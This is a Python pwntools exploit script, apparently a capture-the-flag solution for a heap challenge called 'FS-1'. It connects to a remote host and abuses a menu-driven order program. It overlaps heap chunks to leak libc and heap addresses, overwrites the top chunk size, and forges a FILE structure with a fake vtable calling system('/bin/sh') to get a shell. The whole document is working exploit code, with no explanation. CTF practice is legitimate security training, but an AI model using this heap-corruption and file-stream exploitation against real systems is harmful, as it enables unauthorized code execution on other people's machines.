from pwn import *

# p = process("../FS-1")
p = remote("13.233.196.114",49172)
libc = ELF("../challenge/files/libc.so.6")

def add(index,size,data,f=0):
	print(p.recvuntil("[4] - Show the order."))
	p.sendline("1")
	print(p.recvuntil("?"))
	p.sendline(str(index))
	print(p.recvuntil("?"))
	p.sendline(str(size))
	print(p.recvuntil("?"))
	if f==0:
		p.sendline(data)
	else:
		p.send(data)

def edit(index,size,data,f=0):
	print(p.recvuntil("[4] - Show the order."))
	p.sendline("2")
	print(p.recvuntil("?"))
	p.sendline(str(index))
	print(p.recvuntil("?"))
	p.sendline(str(size))
	print(p.recvuntil("?"))
	if f==0:
		p.sendline(data)
	else:
		p.send(data)

def delete(index):
	print(p.recvuntil("[4] - Show the order."))
	p.sendline("3")
	print(p.recvuntil("?"))
	p.sendline(str(index))

def show(index):
	print(p.recvuntil("[4] - Show the order."))
	p.sendline("4")
	print(p.recvuntil("Please state the order to show?"))
	p.sendline(str(index))
	return p.recvuntil("[1] - Give an order.")

print(p.recvuntil(":"))
p.sendline("A"*15)

add(0,0x60,"A")
add(1,0x60,"B")
add(2,0x60,"C")
add(3,0x60,"D")

edit(0,0x70,p64(0x0)*13 + p64(0xe1))

delete(1)

add(1,0x60,"B")

leak = show(2)
libc_leak = u64(leak[1:7]+"\x00\x00")
libc_base = libc_leak - 0x3c4b78
print(hex(libc_base))

delete(0)
delete(2)

edit(1,0x70,"A"*0x70)

leak = show(1)
heap_leak = u64(leak[0x71:0x77]+"\x00\x00")
print(hex(heap_leak))

edit(1,0x70,p64(0x0)*13 + p64(0x71))

delete(1)

system = libc_base + libc.symbols["system"]
dest = libc_base + 0x3c5600
ptr_top = heap_leak + 0x1c0
heap_fake_vtable = heap_leak + 0x70

add(0,0x60,p64(system)*12)

edit(3,0x70,p64(0x0)*13+p64(0xffffffffffffffff))

add(1,dest-ptr_top-32,"B")
add(2,0x80,"A")
payload = p64(0x0)*3+p64(libc_base+0x3c36e0)+"/bin/sh\x00"+p64(libc_base+0x3c56a3)*7+p64(libc_base+0x3c56a4)+p64(0x0)*4+p64(libc_base+0x3c48e0)+p64(0x1)+p64(0xffffffffffffffff)+p64(0x000000000a000000)+p64(libc_base+0x3c6780)+p64(0xffffffffffffffff)+p64(0x0)+p64(libc_base+0x3c47a0)+p64(0x0)*3+p64(0xffffffff)+p64(0x0)*2+p64(heap_fake_vtable)
edit(2,0x140,payload,1)

p.interactive()